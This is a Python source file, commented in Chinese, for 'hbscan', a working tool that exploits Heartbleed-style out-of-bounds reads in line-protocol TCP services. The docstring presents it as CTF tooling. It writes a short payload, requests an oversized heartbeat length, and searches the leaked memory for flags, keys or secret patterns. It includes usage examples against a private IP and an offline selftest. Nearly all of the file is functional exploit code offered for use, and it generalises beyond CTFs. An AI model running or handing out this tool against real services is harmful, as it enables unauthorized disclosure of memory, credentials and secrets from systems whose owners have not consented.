#!/usr/bin/env python3
"""hbscan - heartbeat 风格 OOB 越界读扫描/泄漏提取工具(行协议 TCP 服务)

背景: 某些自定义行协议服务(CTF 常见 "TLS daemon"/Heartbleed 模拟类)提供两个命令:
    SETPAYLOAD <data>   把数据写入内部缓冲区
    HEARTBEAT <len>     按 len 从缓冲区回显字节(声称长度未校验 -> 越界读)
  先写短载荷再请求大长度, 即可读出缓冲区相邻内存(heartbleed 式), 泄漏内容中
  往往含 flag/密钥等敏感数据(可能隔一个完整缓冲区, 如 tlsd 的 flag 在偏移 4096)。

本工具把整个探测-分析流程参数化:
  1. 对每个 (payload, length) 组合开新连接(状态隔离, 避免污染)
  2. 可选先发 SET 命令写入短载荷, 再发 HEARTBEAT <len>
  3. 从响应中切出回显体(默认取第一个 ':' 之后, 可配 --marker)
  4. 分析回显体: 非载荷非零字节计数 / 首个越界字节偏移 / 可打印串提取 /
     flag(或自定义)正则搜索
  5. 报告每个载荷的泄漏 onset(越界字节数突增处)与泄漏出的内容

与 lineprobe/tcpsweep 的差异: lineprobe 做命令发现, tcpsweep 找单命令数值
边界; hbscan 专攻"写短载荷 + 声称大长度"双命令状态序列, 并做泄漏内容提取
(偏移/非载荷字节/flag 搜索), 直接产出可提交的泄漏数据。

用法:
  python3 pentools/custom/hbscan.py --host 10.0.177.18 --port 9011 \
      --set-cmd 'SETPAYLOAD {payload}' --hb-cmd 'HEARTBEAT {n}' \
      --payloads 'A,AAAA,flag,FLAG' --lengths 64,512,4096,4352,65535
  # 无 set 命令的服务(如 ECHO <n> 直接回显):
  python3 pentools/custom/hbscan.py --host H --port P --hb-cmd 'ECHO {n}' \
      --lengths 1-4096:64
  # 自定义泄漏内容搜索(密钥/序列号):
  python3 pentools/custom/hbscan.py --host H --port P --hb-cmd 'HB {n}' \
      --search 'SECRET[0-9A-F]+' --min-nonz 8
  python3 pentools/custom/hbscan.py --selftest   # 本地自检, 无需网络
"""
import argparse
import re
import socket
import sys
import time

DEFAULT_FLAG_RE = rb'flag\{[^}\n]{0,200}\}'
DEFAULT_LENGTHS = [8, 16, 32, 48, 64, 96, 128, 192, 256, 384, 512,
                   768, 1024, 1536, 2048, 3072, 4096, 4352, 8192,
                   16384, 32768, 65535]


# ---------- 模板渲染 ----------

def render(tmpl, **kw):
    """把模板中的 {name} 替换为对应值(用 replace, 避免 format 转义问题)。"""
    out = tmpl
    for k, v in kw.items():
        out = out.replace('{' + k + '}', str(v))
    return out


# ---------- 响应体切分与内容分析(纯函数, 可自检) ----------

def extract_body(resp, marker):
    """从原始响应中切出回显体: 取第一个 marker 之后的内容;
    marker 为空或不存在时, 退化为第一行(状态行)之后。"""
    if marker:
        idx = resp.find(marker)
        if idx >= 0:
            return resp[idx + len(marker):]
    nl = resp.find(b'\n')
    if nl >= 0:
        return resp[nl + 1:]
    return resp


def printable_runs(data, min_len=4):
    """提取可打印 ASCII 连续串(长度>=min_len), 返回 bytes 列表。"""
    out = []
    cur = bytearray()
    for b in data:
        if 0x20 <= b < 0x7f:
            cur.append(b)
        else:
            if len(cur) >= min_len:
                out.append(bytes(cur))
            cur = bytearray()
    if len(cur) >= min_len:
        out.append(bytes(cur))
    return out


def analyze_body(body, flag_re, search_re=None, min_printable=4, ignore=frozenset()):
    """分析回显体, 返回统计 dict。
    ignore: 载荷字节集合(载荷本身不算泄漏, 与 0x00 一起被忽略)。
    """
    ign = set(ignore) | {0}
    nonz = sum(1 for b in body if b not in ign)
    first_foreign = -1
    for i, b in enumerate(body):
        if b not in ign:
            first_foreign = i
            break
    flags = list(flag_re.findall(body)) if flag_re else []
    searches = list(search_re.findall(body)) if search_re else []
    strs = printable_runs(body, min_printable)
    return {
        'len': len(body),
        'nonz': nonz,
        'first_foreign': first_foreign,
        'ratio': (nonz / len(body)) if body else 0.0,
        'flags': flags,
        'searches': searches,
        'strings': strs,
    }


# ---------- 网络探测 ----------

def drain(sock, quiet=0.15, timeout=1.0, max_chunk=65536):
    """读取响应直到安静(quiet 秒无新数据)或超时。"""
    sock.settimeout(timeout)
    data = b''
    while True:
        try:
            chunk = sock.recv(max_chunk)
            if not chunk:
                break
            data += chunk
            time.sleep(quiet)
        except socket.timeout:
            break
    return data


def probe_responder(host, port, set_cmd, hb_cmd, payload, length,
                    quiet, timeout):
    """真实 socket 探测: 新连接 -> (可选)SET -> HEARTBEAT -> 读响应。
    返回 (raw_resp, err)。"""
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return b'', 'CONNERR %s' % e
    try:
        s.settimeout(timeout)
        try:
            s.recv(4096)  # 排空 banner
        except socket.timeout:
            pass
        if set_cmd:
            s.sendall(render(set_cmd, payload=payload).encode('latin1') + b'\n')
            drain(s, quiet, timeout)
        s.sendall(render(hb_cmd, n=length).encode('latin1') + b'\n')
        resp = drain(s, quiet, timeout)
        return resp, None
    except OSError as e:
        return b'', 'IOERR %s' % e
    finally:
        try:
            s.close()
        except Exception:
            pass


def scan(host, port, set_cmd, hb_cmd, payloads, lengths, marker, flag_re,
         search_re, min_nonz, min_printable, quiet, timeout, retries, verbose):
    """执行扫描, 打印命中与泄漏 onset。返回命中结果列表。"""
    results = []
    for payload in payloads:
        ignore = frozenset(payload.encode('latin1'))
        prev_nonz = None
        onset = None
        for length in lengths:
            resp, err = b'', None
            for attempt in range(retries + 1):
                resp, err = probe_responder(host, port, set_cmd, hb_cmd,
                                            payload, length, quiet, timeout)
                if err is None:
                    break
                time.sleep(0.5)
            if err is not None:
                print(f"[payload={payload!r} len={length}] ERR {err}", flush=True)
                continue
            body = extract_body(resp, marker)
            a = analyze_body(body, flag_re, search_re, min_printable, ignore)
            hit = (a['nonz'] >= min_nonz) or a['flags'] or a['searches']
            if prev_nonz is not None and prev_nonz < min_nonz \
                    and a['nonz'] >= min_nonz and onset is None:
                onset = length
            prev_nonz = a['nonz']
            if hit:
                line = (f"[payload={payload!r} len={length}] "
                        f"nonz={a['nonz']}/{a['len']} ratio={a['ratio']:.2f}"
                        f" first_foreign_off={a['first_foreign']}")
                if a['flags']:
                    line += ' FLAG=' + ','.join(
                        x.decode('latin1', 'replace') for x in a['flags'])
                if a['searches']:
                    line += ' SEARCH=' + ','.join(
                        x.decode('latin1', 'replace') for x in a['searches'])
                if a['strings']:
                    line += ' strs=' + repr(
                        [x.decode('latin1', 'replace') for x in a['strings'][:6]])
                print(line, flush=True)
                results.append((payload, length, a))
        if onset is not None:
            print(f"[payload={payload!r}] leak onset @ len={onset}", flush=True)
        elif verbose:
            print(f"[payload={payload!r}] no leak in scanned lengths "
                  f"(nonz<{min_nonz})", flush=True)
    return results


# ---------- 参数解析 ----------

def parse_lengths(spec):
    """解析 --lengths: 'a,b,c' 或 'a-b' 或 'a-b:step' 混合, 去重保序。"""
    out = []
    for part in spec.split(','):
        part = part.strip()
        if not part:
            continue
        if '-' in part:
            rng, _, step = part.partition(':')
            a, b = rng.split('-', 1)
            lo, hi = int(a, 0), int(b, 0)
            st = int(step, 0) if step else 1
            if st <= 0:
                raise ValueError('step must be > 0: %r' % part)
            out.extend(range(lo, hi + 1, st))
        else:
            out.append(int(part, 0))
    seen = set()
    uniq = []
    for x in out:
        if x not in seen:
            seen.add(x)
            uniq.append(x)
    return uniq


# ---------- 自检(不依赖网络) ----------

def mock_responder(secret, buf_size):
    """构造模拟 heartbeat 服务的 responder(payload, length) -> raw bytes。
    内部缓冲区 = payload + secret + 零填充; 回显 min(length, buf_size) 字节,
    即 length > len(payload) 时泄漏 secret。"""
    def respond(payload, length):
        buf = (payload + secret + b'\x00' * buf_size)[:buf_size]
        echoed = buf[:length]
        return b'200 OK\n:\n' + echoed
    return respond


def selftest():
    checks = []

    def check(name, cond):
        checks.append((name, bool(cond)))

    # 载荷选 'Z': 与 secret('FLAG{...}') 无字节冲突, 非零计数可精确断言
    PAY = b'Z'
    secret = b'FLAG{hbscan_selftest_ok}'
    responder = mock_responder(secret, 64)
    flag_re = re.compile(DEFAULT_FLAG_RE, re.IGNORECASE)

    # 1) 短长度: 只回显载荷 'Z', 无泄漏(忽略载荷字节与 0)
    r1 = responder(PAY, 1)
    b1 = extract_body(r1, b':\n')
    a1 = analyze_body(b1, flag_re, ignore=frozenset(PAY))
    check('no-leak nonz==0', a1['nonz'] == 0)
    check('no-leak no flag', not a1['flags'])
    check('no-leak first_foreign==-1', a1['first_foreign'] == -1)

    # 2) 大长度: 泄漏 secret, 应命中 flag 且非零字节数正确
    r2 = responder(PAY, 1 + len(secret))
    b2 = extract_body(r2, b':\n')
    a2 = analyze_body(b2, flag_re, ignore=frozenset(PAY))
    check('leak body == PAY+secret', b2 == PAY + secret)
    check('leak nonz == len(secret)', a2['nonz'] == len(secret))
    check('leak first_foreign==1', a2['first_foreign'] == 1)
    check('leak flag found', secret.lower() in [f.lower() for f in a2['flags']])

    # 3) marker 缺失时退化: 取状态行之后
    b3 = extract_body(b'200 OK\nhello world\n', b':')
    check('marker-fallback', b3 == b'hello world\n')

    # 4) 可打印串提取
    runs = printable_runs(b'\x00AB\x00CDEFGH\x00', 4)
    check('printable_runs', runs == [b'CDEFGH'])

    # 5) 自定义 search 正则
    a5 = analyze_body(b'xSECRET123y', None, re.compile(rb'SECRET\d+'))
    check('search regex', a5['searches'] == [b'SECRET123'])

    # 6) 全流程 onset 检测: 载荷长 1, 长度>=2 起出现越界字节
    prev, onset = None, None
    for L in [1, 2, 3, 4, 8, 16, 32]:
        body = extract_body(responder(PAY, L), b':\n')
        a = analyze_body(body, flag_re, ignore=frozenset(PAY))
        if prev is not None and prev < 1 and a['nonz'] >= 1 and onset is None:
            onset = L
        prev = a['nonz']
    check('onset at len 2', onset == 2)

    # 7) 长度区间解析
    lens = parse_lengths('1-5,8,0x10-0x12:2')
    check('parse_lengths', lens == [1, 2, 3, 4, 5, 8, 16, 18])

    failed = [n for n, ok in checks if not ok]
    if failed:
        print('selftest FAILED: %s' % failed, file=sys.stderr)
        return False
    print('selftest: all %d checks passed' % len(checks))
    return True


# ---------- main ----------

def main(argv=None):
    ap = argparse.ArgumentParser(
        description='heartbeat 风格 OOB 越界读扫描/泄漏提取(行协议 TCP 服务)')
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=0)
    ap.add_argument('--hb-cmd', default='HEARTBEAT {n}',
                    help='回显命令模板, {n} 被替换为长度(必填语义)')
    ap.add_argument('--set-cmd', default='',
                    help='可选写载荷命令模板, {payload} 被替换; 留空则无 SET')
    ap.add_argument('--payloads', default='A,AAAA,flag,FLAG',
                    help='逗号分隔短载荷(分析时忽略载荷字节本身); 空串=无载荷')
    ap.add_argument('--lengths', default=None,
                    help='逗号分隔长度或 a-b[:step] 区间, 如 64,512,1-4096:64; '
                         '缺省用内置表')
    ap.add_argument('--start', type=int, default=None,
                    help='与 --end/--step 配合的起止扫描')
    ap.add_argument('--end', type=int, default=None)
    ap.add_argument('--step', type=int, default=1)
    ap.add_argument('--marker', default=':\\n',
                    help='回显体起始标记(默认 ":\\n"; 支持 \\n 等转义); '
                         '不存在时取状态行之后')
    ap.add_argument('--flag-re', default=None,
                    help='flag 正则, 默认 flag\\{[^}\\n]{0,200}\\}(忽略大小写)')
    ap.add_argument('--search', default=None, help='额外搜索正则(密钥/序列号等)')
    ap.add_argument('--min-nonz', type=int, default=1,
                    help='非载荷非零字节数达到该值才报告(泄漏判定阈值)')
    ap.add_argument('--min-printable', type=int, default=4)
    ap.add_argument('--quiet', type=float, default=0.15, help='安静期(秒)')
    ap.add_argument('--timeout', type=float, default=5.0)
    ap.add_argument('--retries', type=int, default=1)
    ap.add_argument('--verbose', action='store_true')
    ap.add_argument('--selftest', action='store_true', help='本地自检(无需网络)')
    args = ap.parse_args(argv)

    if args.selftest:
        return 0 if selftest() else 1

    if not args.port:
        ap.error('--port 必填(扫描模式); 或使用 --selftest')

    if args.lengths:
        lengths = parse_lengths(args.lengths)
    elif args.start is not None and args.end is not None:
        if args.step <= 0:
            ap.error('--step must be > 0')
        lengths = list(range(args.start, args.end + 1, args.step))
    else:
        lengths = DEFAULT_LENGTHS

    payloads = args.payloads.split(',') if args.payloads != '' else ['']
    flag_re = re.compile(args.flag_re or DEFAULT_FLAG_RE, re.IGNORECASE)
    search_re = re.compile(args.search) if args.search else None
    marker = None
    if args.marker:
        marker = args.marker.encode('latin1').decode('unicode_escape').encode('latin1')

    print(f"[*] hbscan {args.host}:{args.port} set={args.set_cmd!r} "
          f"hb={args.hb_cmd!r} payloads={payloads} lengths={len(lengths)} "
          f"min_nonz={args.min_nonz}", file=sys.stderr, flush=True)
    scan(args.host, args.port, args.set_cmd, args.hb_cmd, payloads, lengths,
         marker, flag_re, search_re, args.min_nonz, args.min_printable,
         args.quiet, args.timeout, args.retries, args.verbose)
    return 0


if __name__ == '__main__':
    sys.exit(main())
